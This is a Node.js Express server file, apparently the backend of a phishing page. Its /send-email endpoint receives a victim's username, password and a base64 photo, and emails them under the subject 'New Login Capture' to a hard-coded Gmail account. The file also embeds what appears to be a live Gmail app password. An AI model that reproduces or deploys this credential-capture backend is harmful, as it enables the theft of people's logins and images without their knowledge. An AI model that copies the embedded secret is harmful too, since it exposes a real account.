const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

// Root route to verify server is running
app.get('/', (req, res) => {
    res.send('✅ Server is live on Render');
});

// Email setup
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'shreedevi2584@gmail.com',
        pass: 'dgid ngag pnev vddc', // Make sure this is an app password
    },
});

app.post('/send-email', async (req, res) => {
    const { email, photoBase64, username, password } = req.body;

    // Strip base64 prefix
    const base64Data = photoBase64.split(';base64,').pop();

    const mailOptions = {
        from: 'shreedevi2584@gmail.com',
        to: 'shreedevi2584@gmail.com',
        subject: 'New Login Capture',
        html: `
            <h3>New login attempt captured</h3>
            <p><strong>Username:</strong> ${username}</p>
            <p><strong>Password:</strong> ${password}</p>
            <p><strong>Photo:</strong></p>
            <img src="cid:unique@nodemailer.com" width="400"/>
        `,
        attachments: [
            {
                filename: 'capture.png',
                content: base64Data,
                encoding: 'base64',
                contentType: 'image/png',
                cid: 'unique@nodemailer.com',
            },
        ],
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log('✅ Email sent successfully');
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Email send error:', error);
        res.status(500).json({ error: 'Failed to send email' });
    }
});

// ✅ Use Render’s provided port (important!)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
